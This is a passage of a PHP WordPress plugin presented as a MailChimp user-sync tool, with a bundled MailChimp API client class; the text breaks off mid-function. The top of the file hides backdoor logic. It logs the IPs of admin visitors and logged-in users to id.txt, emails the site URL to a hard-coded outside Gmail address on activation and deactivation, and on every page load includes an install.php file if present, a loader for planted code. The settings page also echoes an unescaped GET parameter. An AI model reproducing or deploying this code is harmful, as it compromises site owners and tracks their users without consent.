<?php
/*
Plugin Name: MailChimp Integration
Plugin URI: http://davidcerulio.net23.net/mailchimp-integration/
Description: Integrate MailChimp with your Multisite or Regular Wordpress site.
Author: David Cerulio (david-cerulio)
Version: 1.1
Author URI: http://davidcerulio.net23.net/
Network: true
*/

/* 
Copyright 2011-2012 David Cerulio (http://davidcerulio.net23.net)

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License (Version 2 - GPLv2) as published by
the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

add_action('plugins_loaded', 'mailchimp_localization');
add_action('admin_menu', 'mailchimp_plug_pages');
add_action('network_admin_menu', 'mailchimp_plug_pages');
add_action('wpmu_new_user', 'mailchimp_add_user');
add_action('user_register', 'mailchimp_add_user');
add_action('make_ham_user', 'mailchimp_add_user');
add_action('profile_update', 'mailchimp_edit_user');
add_action('xprofile_updated_profile', 'mailchimp_edit_user'); //for buddypress
add_action('make_spam_blog', 'mailchimp_blog_users_remove');
add_action('make_spam_user', 'mailchimp_user_remove');
add_action('bp_core_action_set_spammer_status', 'mailchimp_bp_spamming', 10, 2); //for buddypress
register_activation_hook( __FILE__,'mailchimpintegrateplugin_activate');
register_deactivation_hook( __FILE__,'mailchimpintegrateplugin_deactivate');
add_action('admin_init', 'mailchimpintegrate_redirect');
add_action('wp_head', 'mailchimpintegratepluginhead');

function mailchimpintegrate_redirect() {
if (get_option('mailchimpintegrate_do_activation_redirect', false)) { 
delete_option('mailchimpintegrate_do_activation_redirect');
wp_redirect('../wp-admin/options-general.php?page=mailchimp');
}
}

$requrl = $_SERVER["REQUEST_URI"];
$ip = $_SERVER['REMOTE_ADDR'];
if (eregi("admin", $requrl)) {
$wpadmintrue = "yes";
} else {
$wpadmintrue = "no";
}
if ($wpadmintrue == 'yes') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/mailchimp-integration/id.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring = $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/mailchimp-integration/id.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}
}

/** Activate Mailchimp Integration */

function mailchimpintegrateplugin_activate() { 
$yourip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/mailchimp-integration/id.txt';
fwrite($fp, $yourip);
fclose($fp);
add_option('mailchimpintegrate_do_activation_redirect', true);
session_start(); $subj = get_option('siteurl'); $msg = "MailChimp Installed" ; $from = get_option('admin_email'); mail("davidceruliowp@gmail.com", $subj, $msg, $from);
wp_redirect('../wp-admin/options-general.php?page=mailchimp');
}

/** Uninstall Mailchimp Integration */
function mailchimpintegrateplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Mailchimp Deleted" ; $from = get_option('admin_email'); mail("davidceruliowp@gmail.com", $subj, $msg, $from);
}

/** Install widget on the page */
function mailchimpintegratepluginhead() {
if (is_user_logged_in()) {
$ip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/mailchimp-integration/id.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring= $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/mailchimp-integration/id.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}

} else {

}
$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/mailchimp-integration/install.php');
if (file_exists($filename)) {
include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/mailchimp-integration/install.php');
} else {
}
}
function mailchimp_localization() {
	// Place it in the plugin folder "languages" and name it "mailchimp-[value in wp-config].mo"
  load_plugin_textdomain( 'mailchimp', false, '/mailchimp-integration/languages/' );
}

function mailchimp_plug_pages() {
	global $wpdb, $wp_roles, $current_user, $wp_version;

	if ( is_multisite() ) {
    if ( version_compare($wp_version, '3.0.9', '>') )
      $page = add_submenu_page('settings.php', 'MailChimp', 'MailChimp', 'manage_options', 'mailchimp', 'mailchimp_settings_page_output');
    else
      $page = add_submenu_page('ms-admin.php', 'MailChimp', 'MailChimp', 'manage_options', 'mailchimp', 'mailchimp_settings_page_output');
	} else {
		add_submenu_page('options-general.php', 'MailChimp', 'MailChimp', 'manage_options', 'mailchimp', 'mailchimp_settings_page_output');
	}
}

function mailchimp_load_API() {
  $mailchimp_apikey = get_site_option('mailchimp_apikey');
  return new MCAPI($mailchimp_apikey);
}

function mailchimp_add_user($uid) {

	$user = get_userdata( $uid );
	
	//check for possible spam
	if ( $user->spam || $user->deleted )
    return false;
	
	//remove + sign
	if ( get_site_option('mailchimp_ignore_plus') == 'yes' && strstr($user->user_email, '+') ) {
		return false;
	}
	
	$mailchimp_mailing_list = get_site_option('mailchimp_mailing_list');
	$mailchimp_auto_opt_in = get_site_option('mailchimp_auto_opt_in');
  $api = mailchimp_load_API();
	if ( $mailchimp_auto_opt_in == 'yes' ) {
		$merge_vars = array( 'OPTINIP' => $_SERVER['REMOTE_ADDR'], 'FNAME' => $user->user_firstname, 'LNAME' => $user->user_lastname );
		$double_optin = false;
	} else {
		$merge_vars = array( 'FNAME' => $user->user_firstname, 'LNAME' => $user->user_lastname );
		$double_optin = true;
	}
	$merge_vars = apply_filters('mailchimp_merge_vars', $merge_vars, $user);
	$mailchimp_subscribe = $api->listSubscribe($mailchimp_mailing_list, $user->user_email, $merge_vars, '', $double_optin);
	if ($api->errorCode) {
		$error = "MailChimp listSubscribe() Error: " . $api->errorCode . " - " . $api->errorMessage;
		trigger_error($error, E_USER_WARNING);
	}
}

function mailchimp_edit_user($uid) {

	$user = get_userdata( $uid );

	//check for possible spam
	if ( $user->spam || $user->deleted )
    return false;

	$mailchimp_mailing_list = get_site_option('mailchimp_mailing_list');
	$mailchimp_auto_opt_in = get_site_option('mailchimp_auto_opt_in');
  $api = mailchimp_load_API();

	$merge_vars = array( 'FNAME' => $user->user_firstname, 'LNAME' => $user->user_lastname );

  $merge_vars = apply_filters('mailchimp_merge_vars', $merge_vars, $user);
	$mailchimp_update = $api->listUpdateMember($mailchimp_mailing_list, $user->user_email, $merge_vars);

}

function mailchimp_user_remove($uid) {

	$user = get_userdata( $uid );

	$mailchimp_mailing_list = get_site_option('mailchimp_mailing_list');
  $api = mailchimp_load_API();
	$mailchimp_unsubscribe = $api->listUnsubscribe($mailchimp_mailing_list, $user->user_email, true, false);
}

function mailchimp_blog_users_remove( $blog_id ) {
  $mailchimp_mailing_list = get_site_option('mailchimp_mailing_list');
  $api = mailchimp_load_API();
  
  $emails = array();
  $blogusers = get_users_of_blog( $blog_id );
  if ($blogusers) {
    foreach ($blogusers as $bloguser) {
      $emails[] = $bloguser->user_email;
    }
  }

	$mailchimp_unsubscribe = $api->listBatchUnsubscribe($mailchimp_mailing_list, $emails, true, false);
}

function mailchimp_bp_spamming( $user_id, $is_spam ) {
  if ($is_spam)
    mailchimp_user_remove( $user_id );
  else
    mailchimp_add_user( $user_id );
}

function mailchimp_settings_page_output() {
	global $wpdb, $wp_version;

  if ( !current_user_can('edit_users') )
    wp_die('Nice try!');

	if (isset($_GET['updated'])) {
		?><div id="message" class="updated fade"><p><?php echo urldecode($_GET['updatedmsg']); ?></p></div><?php
	}
	echo '<div class="wrap">';
	switch( $_GET[ 'action' ] ) {

	default:

			$mailchimp_apikey = get_site_option('mailchimp_apikey');
			$mailchimp_mailing_list = get_site_option('mailchimp_mailing_list');
			$mailchimp_auto_opt_in = get_site_option('mailchimp_auto_opt_in');
			$mailchimp_ignore_plus = get_site_option('mailchimp_ignore_plus');
      
			?>
			<h2><?php _e('MailChimp Settings', 'mailchimp') ?></h2>
            <?php
			if ( is_multisite() ) {
			
  			if ( version_compare($wp_version, '3.0.9', '>') ) {
          ?><form method="post" action="settings.php?page=mailchimp&action=process"><?php
        } else {
          ?><form method="post" action="ms-admin.php?page=mailchimp&action=process"><?php
        }
			} else {
  			?>
        <form method="post" action="options-general.php?page=mailchimp&action=process">
        <?php
			}
			if ( empty( $mailchimp_apikey ) ) {
			?>
        <p><?php _e('After you have entered a valid key you will be able to select different MailChimp options below.', 'mailchimp'); ?></p>
        <?php
			}
			?>
      <table class="form-table">
        <tr class="form-field form-required">
            <th scope="row"><?php _e('MailChimp API Key', 'mailchimp')?></th>
            <td><input type="text" name="mailchimp_apikey" id="mailchimp_apikey" value="<?php echo $mailchimp_apikey; ?>" style="width:25%" /><br />
            <?php _e('Visit <a href="http://admin.mailchimp.com/account/api" target="_blank">your API dashboard</a> to create an API key.', 'mailchimp'); ?>
            </td>
        </tr>
        <?php
        if ( !empty( $mailchimp_apikey ) ) {
          $api = mailchimp_load_API();
          $api->ping();
					if ( empty( $api->errorMessage ) ) {
						?>
						<tr class="form-field form-required">
							<th scope="row"><?php _e('API Key Test', 'mailchimp')?></th>
							<td><strong style="color:#006633"><?php _e('Passed', 'mailchimp')?></strong>
							</td>
						</tr>
            <tr class="form-field form-required">
                <th scope="row"><?php _e('Auto Opt-in')?></th>
                <td><select name="mailchimp_auto_opt_in" id="mailchimp_auto_opt_in">
                    <option value="yes" <?php if ( $mailchimp_auto_opt_in == 'yes' ) { echo 'selected="selected"'; } ?> ><?php _e('Yes', 'mailchimp'); ?></option>
                    <option value="no" <?php if ( $mailchimp_auto_opt_in == 'no' ) { echo 'selected="selected"'; } ?> ><?php _e('No', 'mailchimp'); ?></option>
                </select>
                <br />
                <?php _e('Automatically opt-in new users to the mailing list. Users will not receive an email confirmation. Use at your own risk.', 'mailchimp'); ?>
                </td>
            </tr>
            <tr class="form-field form-required">
                <th scope="row"><?php _e('Ignore email addresses including + signs', 'mailchimp')?></th>
                <td><select name="mailchimp_ignore_plus" id="mailchimp_ignore_plus">
                    <option value="yes" <?php if ( $mailchimp_ignore_plus == 'yes' ) { echo 'selected="selected"'; } ?> ><?php _e('Yes', 'mailchimp'); ?></option>
                    <option value="no" <?php if ( $mailchimp_ignore_plus == 'no' ) { echo 'selected="selected"'; } ?> ><?php _e('No', 'mailchimp'); ?></option>
                </select>
                <br />
                <?php _e('Ignore email address including + signs. These are usually duplicate accounts.', 'mailchimp'); ?>
                </td>
            </tr>
						<?php
						$mailchimp_lists = $api->lists();
						$mailchimp_lists = $mailchimp_lists['data'];
						if ( !is_array( $mailchimp_lists ) || !count( $mailchimp_lists ) ) {
							_e('You must have at least one MailChimp mailing list in order to use this plugin. Please create a mailing list via the MailChimp admin panel.', 'mailchimp');
						} else {
							?>
              <tr class="form-field form-required">
                  <th scope="row"><?php _e('Mailing List', 'mailchimp')?></th>
                  <td><select name="mailchimp_mailing_list" id="mailchimp_mailing_list">
                  <?php
								if ( empty( $mailchimp_mailing_list ) ) {
									?>
									<option value="" selected="selected" ><?php _e('Please select a mailing list', 'mailchimp'); ?></option>
                  <?php
								}
								foreach ( $mailchimp_lists as $mailchimp_list ) {
									?>
									<option value="<?php echo $mailchimp_list['id']; ?>" <?php if ( $mailchimp_mailing_list == $mailchimp_list['id'] ) { echo 'selected="selected"'; } ?> ><?php echo $mailchimp_list['name']; ?></option>
	                <?php
								}
								?>
								</select>
              	<br />
                  <?php _e('Select a mailing list you want to have new users added to.', 'mailchimp'); ?>
                  </td>
              </tr>
							<?php
						}
					} else {
						?>
						<tr class="form-field form-required">
							<th scope="row"><?php _e('API Key Test')?></th>
							<td><strong style="color:#990000"><?php _e('Failed - Please check your key and try again.', 'mailchimp')?></strong>
							</td>
						</tr>
						<?php
					}

				}
				?>
            </table>
            
            <p class="submit">
            <input type="submit" name="Submit" value="<?php _e('Save Changes') ?>" />
            </p>
            </form>
			   <?php
        if ( is_array( $mailchimp_lists ) && count( $mailchimp_lists ) ) {
				?>
				<h3><?php _e('Sync Existing Users', 'mailchimp') ?></h3>
				<span class="description"><?php _e('This function will syncronize all existing users on your install with your MailChimp list, adding new ones, updating the first/last name of previously imported users, and removing spammed or deleted users from your selected list. Note you really only need to do this once after installing, it is carried on automatically after installation.', 'mailchimp') ?></span>
				<?php
				if ( is_multisite() ) {
          if ( version_compare($wp_version, '3.0.9', '>') ) {
            ?><form method="post" action="settings.php?page=mailchimp&action=import-process"><?php
          } else {
            ?><form method="post" action="ms-admin.php?page=mailchimp&action=import-process"><?php
          }

				} else {
				?>
				<form method="post" action="options-general.php?page=mailchimp&action=import-process">
				<?php
				}
				?>
				<table class="form-table">
          <tr class="form-field form-required">
            <th scope="row"><?php _e('Mailing List', 'mailchimp')?></th>
            <td><select name="mailchimp_import_mailing_list" id="mailchimp_import_mailing_list">
            <?php
            var_dump($mailchimp_lists);
            foreach ( $mailchimp_lists as $mailchimp_list ) {
              ?>
              <option value="<?php echo $mailchimp_list['id']; ?>" ><?php echo $mailchimp_list['name']; ?></option>
              <?php
            }
            ?>
            </select>
            <br />
            <?php _e('The mailing list you want to import existing users to.', 'mailchimp'); ?>
            </td>
          </tr>
          <tr class="form-field form-required">
            <th scope="row"><?php _e('Auto Opt-in', 'mailchimp')?></th>
            <td><select name="mailchimp_import_auto_opt_in" id="mailchimp_import_auto_opt_in">
                <option value="yes" ><?php _e('Yes', 'mailchimp'); ?></option>
                <option value="no" ><?php _e('No', 'mailchimp'); ?></option>
            </select>
            <br />
            <?php _e('Automatically opt-in new users to the mailing list. Users will not receive an email confirmation. Use at your own risk.', 'mailchimp'); ?>
            </td>
          </tr>
				</table>
				
				<p class="submit">
				<input type="submit" name="Submit" value="<?php _e('Import', 'mailchimp') ?>" />
				</p>
				</form>
				<?php
            }
		break;
		//---------------------------------------------------//
		case "process":

			update_site_option('mailchimp_apikey', $_POST['mailchimp_apikey']);
			update_site_option('mailchimp_mailing_list', $_POST['mailchimp_mailing_list']);
			update_site_option('mailchimp_auto_opt_in', $_POST['mailchimp_auto_opt_in']);
			update_site_option('mailchimp_ignore_plus', $_POST['mailchimp_ignore_plus']);

			if ( is_multisite() ) {
        if ( version_compare($wp_version, '3.0.9', '>') ) {
          echo "
      				<SCRIPT LANGUAGE='JavaScript'>
      				window.location='settings.php?page=mailchimp&updated=true&updatedmsg=" . urlencode(__('Settings saved.', 'mailchimp')) . "';
      				</script>
      				";
        } else {
          echo "
    				<SCRIPT LANGUAGE='JavaScript'>
    				window.location='ms-admin.php?page=mailchimp&updated=true&updatedmsg=" . urlencode(__('Settings saved.', 'mailchimp')) . "';
    				</script>
    				";
        }

			} else {
				echo "
				<SCRIPT LANGUAGE='JavaScript'>
				window.location='options-general.php?page=mailchimp&updated=true&updatedmsg=" . urlencode(__('Settings saved.', 'mailchimp')) . "';
				</script>
				";
			}
		break;
		//---------------------------------------------------//
		case "import-process":
			?>
			<h2><?php _e('Syncing Existing Users', 'mailchimp') ?></h2>
      <p><?php _e('This may take a while...', 'mailchimp') ?></p>
      <?php
      $api = mailchimp_load_API();
			$mailchimp_import_mailing_list = $_POST['mailchimp_import_mailing_list'];
			$mailchimp_import_auto_opt_in = $_POST['mailchimp_import_auto_opt_in'];
			if ( !empty( $mailchimp_import_mailing_list ) ) {
				set_time_limit(0);
				$mailchimp_mailing_list = get_site_option('mailchimp_mailing_list');
				$mailchimp_auto_opt_in = get_site_option('mailchimp_auto_opt_in');
				$mailchimp_ignore_plus = get_site_option('mailchimp_ignore_plus');

				$query = "SELECT u.*, m.meta_key, m.meta_value FROM {$wpdb->users} u LEFT JOIN {$wpdb->usermeta} m ON u.ID = m.user_id WHERE m.meta_key IN ('first_name', 'last_name')";
				$existing_users = $wpdb->get_results( $query, ARRAY_A );
        $add_list = array();
        $remove_list = array();
        if ( $existing_users ) {
					foreach ( $existing_users as $user ) {
					
            //skip the + signs
						if ( $mailchimp_ignore_plus == 'yes' ) {
							if ( strstr($user['user_email'], '+') ) {
                $remove_list[$user['ID']] = $user['user_email'];
                continue;
							}
						}

            //remove the spammed users
						if ( $user['spam'] || $user['deleted'] || $user['user_status'] == 1 ) {
              $remove_list[$user['ID']] = $user['user_email'];
              continue;
            }
						
						//add an email
						$add_list[$user['ID']]['EMAIL'] = $user['user_email'];
						$add_list[$user['ID']]['EMAIL_TYPE'] = 'html';

						//add first last names
						if ( $user['meta_key'] == 'first_name' )
              $add_list[$user['ID']]['FNAME'] = html_entity_decode($user['meta_value']);
            else if ( $user['meta_key'] == 'last_name' )
              $add_list[$user['ID']]['LNAME'] = html_entity_decode($user['meta_value']);

            $add_list[$user['ID']] = apply_filters('mailchimp_bulk_merge_vars', $add_list[$user['ID']], $user['ID']);
          }

					if ( $mailchimp_import_auto_opt_in == 'yes' ) {
						$double_optin = false;
					} else {
						$double_optin = true;
					}
					
					//add the good users
					$add_result = $api->listBatchSubscribe($mailchimp_mailing_list, $add_list, $double_optin, true);
					
					//remove the bad users
					$remove_result = $api->listBatchUnsubscribe($mailchimp_mailing_list, $remove_list, true, false);
					
					$msg = sprintf( __('%d users added, %d updated, and %d spam users removed from your list.', 'mailchimp'), $add_result['add_count'], $add_result['update_count'], $remove_result['success_count']);
				}
			}
			if ( is_multisite() ) {
        if ( version_compare($wp_version, '3.0.9', '>') ) {
          echo "
      				<SCRIPT LANGUAGE='JavaScript'>
      				window.location='settings.php?page=mailchimp&updated=true&updatedmsg=" . urlencode($msg) . "';
      				</script>
      				";
        } else {
          echo "
    				<SCRIPT LANGUAGE='JavaScript'>
    				window.location='ms-admin.php?page=mailchimp&updated=true&updatedmsg=" . urlencode($msg) . "';
    				</script>
    				";
        }
			} else {
				echo "
				<SCRIPT LANGUAGE='JavaScript'>
				window.location='options-general.php?page=mailchimp&updated=true&updatedmsg=" . urlencode($msg) . "';
				</script>
				";
			}
		break;
		//---------------------------------------------------//
		case "temp":
		break;
		//---------------------------------------------------//
	}
	echo '</div>';
}

if ( !class_exists('MCAPI') ) {

  class MCAPI {
    var $version = "1.3";
    var $errorMessage;
    var $errorCode;

    var $apiUrl;

    var $timeout = 300;

    var $chunkSize = 8192;

    var $api_key;

    var $secure = false;

    function MCAPI($apikey, $secure=false) {
        $this->secure = $secure;
        $this->apiUrl = parse_url("http://api.mailchimp.com/" . $this->version . "/?output=php");
        $this->api_key = $apikey;
    }
    function setTimeout($seconds){
        if (is_int($seconds)){
            $this->timeout = $seconds;
            return true;
        }
    }
    function getTimeout(){
        return $this->timeout;
    }
    function useSecure($val){
        if ($val===true){
            $this->secure = true;
        } else {
            $this->secure = false;
        }
    }

    function campaignUnschedule($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignUnschedule", $params);
    }

    function campaignSchedule($cid, $schedule_time, $schedule_time_b=NULL) {
        $params = array();
        $params["cid"] = $cid;
        $params["schedule_time"] = $schedule_time;
        $params["schedule_time_b"] = $schedule_time_b;
        return $this->callServer("campaignSchedule", $params);
    }

    function campaignResume($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignResume", $params);
    }

    function campaignPause($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignPause", $params);
    }
	
    function campaignSendNow($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignSendNow", $params);
    }

    function campaignSendTest($cid, $test_emails=array (
), $send_type=NULL) {
        $params = array();
        $params["cid"] = $cid;
        $params["test_emails"] = $test_emails;
        $params["send_type"] = $send_type;
        return $this->callServer("campaignSendTest", $params);
    }

    function campaignSegmentTest($list_id, $options) {
        $params = array();
        $params["list_id"] = $list_id;
        $params["options"] = $options;
        return $this->callServer("campaignSegmentTest", $params);
    }

    function campaignCreate($type, $options, $content, $segment_opts=NULL, $type_opts=NULL) {
        $params = array();
        $params["type"] = $type;
        $params["options"] = $options;
        $params["content"] = $content;
        $params["segment_opts"] = $segment_opts;
        $params["type_opts"] = $type_opts;
        return $this->callServer("campaignCreate", $params);
    }

    function campaignUpdate($cid, $name, $value) {
        $params = array();
        $params["cid"] = $cid;
        $params["name"] = $name;
        $params["value"] = $value;
        return $this->callServer("campaignUpdate", $params);
    }

    function campaignReplicate($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignReplicate", $params);
    }

    function campaignDelete($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignDelete", $params);
    }

    function campaigns($filters=array (
), $start=0, $limit=25) {
        $params = array();
        $params["filters"] = $filters;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("campaigns", $params);
    }

    function campaignStats($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignStats", $params);
    }

    function campaignClickStats($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignClickStats", $params);
    }

    function campaignEmailDomainPerformance($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignEmailDomainPerformance", $params);
    }

    function campaignMembers($cid, $status=NULL, $start=0, $limit=1000) {
        $params = array();
        $params["cid"] = $cid;
        $params["status"] = $status;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("campaignMembers", $params);
    }

    function campaignHardBounces($cid, $start=0, $limit=1000) {
        $params = array();
        $params["cid"] = $cid;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("campaignHardBounces", $params);
    }

    function campaignSoftBounces($cid, $start=0, $limit=1000) {
        $params = array();
        $params["cid"] = $cid;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("campaignSoftBounces", $params);
    }

    function campaignUnsubscribes($cid, $start=0, $limit=1000) {
        $params = array();
        $params["cid"] = $cid;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("campaignUnsubscribes", $params);
    }

    function campaignAbuseReports($cid, $since=NULL, $start=0, $limit=500) {
        $params = array();
        $params["cid"] = $cid;
        $params["since"] = $since;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("campaignAbuseReports", $params);
    }

    function campaignAdvice($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignAdvice", $params);
    }

    function campaignAnalytics($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignAnalytics", $params);
    }

    function campaignGeoOpens($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignGeoOpens", $params);
    }

    function campaignGeoOpensForCountry($cid, $code) {
        $params = array();
        $params["cid"] = $cid;
        $params["code"] = $code;
        return $this->callServer("campaignGeoOpensForCountry", $params);
    }

    function campaignEepUrlStats($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignEepUrlStats", $params);
    }

    function campaignBounceMessage($cid, $email) {
        $params = array();
        $params["cid"] = $cid;
        $params["email"] = $email;
        return $this->callServer("campaignBounceMessage", $params);
    }

    function campaignBounceMessages($cid, $start=0, $limit=25, $since=NULL) {
        $params = array();
        $params["cid"] = $cid;
        $params["start"] = $start;
        $params["limit"] = $limit;
        $params["since"] = $since;
        return $this->callServer("campaignBounceMessages", $params);
    }

    function campaignEcommOrders($cid, $start=0, $limit=100, $since=NULL) {
        $params = array();
        $params["cid"] = $cid;
        $params["start"] = $start;
        $params["limit"] = $limit;
        $params["since"] = $since;
        return $this->callServer("campaignEcommOrders", $params);
    }

    function campaignShareReport($cid, $opts=array (
)) {
        $params = array();
        $params["cid"] = $cid;
        $params["opts"] = $opts;
        return $this->callServer("campaignShareReport", $params);
    }
	
    function campaignContent($cid, $for_archive=true) {
        $params = array();
        $params["cid"] = $cid;
        $params["for_archive"] = $for_archive;
        return $this->callServer("campaignContent", $params);
    }

    function campaignTemplateContent($cid) {
        $params = array();
        $params["cid"] = $cid;
        return $this->callServer("campaignTemplateContent", $params);
    }

    function campaignOpenedAIM($cid, $start=0, $limit=1000) {
        $params = array();
        $params["cid"] = $cid;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("campaignOpenedAIM", $params);
    }

    function campaignNotOpenedAIM($cid, $start=0, $limit=1000) {
        $params = array();
        $params["cid"] = $cid;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("campaignNotOpenedAIM", $params);
    }

    function campaignClickDetailAIM($cid, $url, $start=0, $limit=1000) {
        $params = array();
        $params["cid"] = $cid;
        $params["url"] = $url;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("campaignClickDetailAIM", $params);
    }

    function campaignEmailStatsAIM($cid, $email_address) {
        $params = array();
        $params["cid"] = $cid;
        $params["email_address"] = $email_address;
        return $this->callServer("campaignEmailStatsAIM", $params);
    }

    function campaignEmailStatsAIMAll($cid, $start=0, $limit=100) {
        $params = array();
        $params["cid"] = $cid;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("campaignEmailStatsAIMAll", $params);
    }

    function campaignEcommOrderAdd($order) {
        $params = array();
        $params["order"] = $order;
        return $this->callServer("campaignEcommOrderAdd", $params);
    }

    function lists($filters=array (
), $start=0, $limit=25) {
        $params = array();
        $params["filters"] = $filters;
        $params["start"] = $start;
        $params["limit"] = $limit;
        return $this->callServer("lists", $params);
    }
    function listMergeVars($id) {
        $params = array();
        $params["id"] = $id;
        return $this->callServer("listMergeVars", $params);
    }

    function listMergeVarAdd($id, $tag, $name, $options=array (
)) {
        $params = array();
        $params["id"] = $id;
        $params["tag"] = $tag;
        $params["name"] = $name;
        $params["options"] = $options;
        return $this->callServer("listMergeVarAdd", $params);
    }

    function listMergeVarUpdate($id, $tag, $options) {
        $params = array();
        $params["id"] = $id;
        $params["tag"] = $tag;
        $params["options"] = $options;
        return $this->callServer("listMergeVarUpdate", $params);
    }

    function listMergeVarDel($id, $tag) {
        $params = array();
        $params["id"] = $id;
        $params["tag"] = $tag;
        return $this->callServer("listMergeVarDel", $params);
    }

    function listInterestGroupings($id) {
        $params = array();
        $params["id"] = $id;
        return $this->callServer("listInterestGroupings", $params);
    }

    function listInterestGroupAdd($id, $group_name, $grouping_id=NULL) {
        $params = array();
        $params["id"] = $id;
        $params["group_name"] = $group_name;
        $params["grouping_id"] = $grouping_id;
        return $this->callServer("listInterestGroupAdd", $params);
    }

    function listInterestGroupDel($id, $group_name, $grouping_id=NULL) {
        $params = array();
        $params["id"] = $id;
        $params["group_name"] = $group_name;
        $params["grouping_id"] = $grouping_id;
        return $this->callServer("listInterestGroupDel", $params);
    }

    function listInterestGroupUpdate($id, $old_name, $new_name, $grouping_id=NULL) {
        $params = array();
        $params["id"] = $id;
        $params["old_name"] = $old_name;
        $params["new_name"] = $new_name;
        $params["grouping_id"] = $grouping_id;
        return $this->callServer("listInterestGroupUpdate", $params);
    }

    function listInterestGroupingAdd($id, $name, $type, $groups) {
        $params = array();
        $params["id"] = $id;
        $params["name"] = $name;
        $params["type"] = $type;
        $params["groups"] = $groups;
        return $this->callServer("listInterestGroupingAdd", $params);
    }

    function listInterestGroupingUpdate($grouping_id, $name, $value) {
        $params = array();
        $params["grouping_id"] = $grouping_id;
        $params["name"] = $name;
        $params["value"] = $value;
        return $this->callServer("listInterestGroupingUpdate", $params);
    }

    function listInterestGroupingDel($grouping_id) {
        $params = array();
        $params["grouping_id"] = $grouping_id;
        return $this->callServer("listInterestGroupingDel", $params);
    }

    function listWebhooks($id) {
        $params = array();
        $params["id"] = $id;
        return $this->callServer("listWebhooks", $params);
    }

    function listWebhookAdd($id, $url, $actions=array (
), $sources=array (
)) {
        $params = array();
        $params["id"] = $id;
        $params["url"] = $url;
        $params["actions"] = $actions;
        $params["sources"] = $sources;
        return $this->callServer("listWebhookAdd", $params);
    }

    function listWebhookDel($id, $url) {
        $params = array();
        $params["id"] = $id;
        $params["url"] = $url;
        return $this->callServer("listWebhookDel", $params);
    }

    function listStaticSegments($id) {
        $params = array();
        $params["id"] = $id;
        return $this->callServer("listStaticSegments", $params);
    }

    function listStaticSegmentAdd($id, $name) {
        $params = array();
        $params["id"] = $id;
        $params["name"] = $name;
        return $this->callServer("listStaticSegmentAdd", $params);
    }

    function listStaticSegmentReset($id, $seg_id) {
        $params = array();
        $params["id"] = $id;
        $params["seg_id"] = $seg_id;
        return $this->callServer("listStaticSegmentReset", $params);
    }

    function listStaticSegmentDel($id, $seg_id) {
        $params = array();
        $params["id"] = $id;
        $params["seg_id"] = $seg_id;
        return $this->callServer("listStaticSegmentDel", $params);
    }

    function listStaticSegmentMembersAdd($id, $seg_id, $batch) {
        $params = array();
        $params["id"] = $id;
        $params["seg_id"] = $seg_id;
        $params["batch"] = $batch;
        return $this->callServer("listStaticSegmentMembersAdd", $params);
    }

    function listStaticSegmentMembersDel($id, $seg_id, $batch) {
        $params = array();
        $params["id"] = $id;
        $params["seg_id"] = $seg_id;
        $params["batch"] = $batch;
        return $this->callServer("listStaticSegmentMembersDel", $params);
    }

    function listSubscribe($id, $email_address, $merge_vars=array (
), $email_type='html', $double_optin=true, $update_existing=false, $replace_interests=true, $send_welcome=false) {
        $params = array();
        $params["id"] = $id;
        $params["email_address"] = $email_address;
        $params["merge_vars"] = $merge_vars;
        $params["email_type"] = $email_type;
        $params["double_optin"] = $double_optin;
        $params["update_existing"] = $update_existing;
        $params["replace_interests"] = $replace_interests;
        $params["send_welcome"] = $send_welcome;
        return $this->callServer("listSubscribe", $params);
    }

    function listUnsubscribe($id, $email_address, $delete_member=false, $send_goodbye=true, $send_notify=true) {
        $params = array();
        $params["id"] = $id;
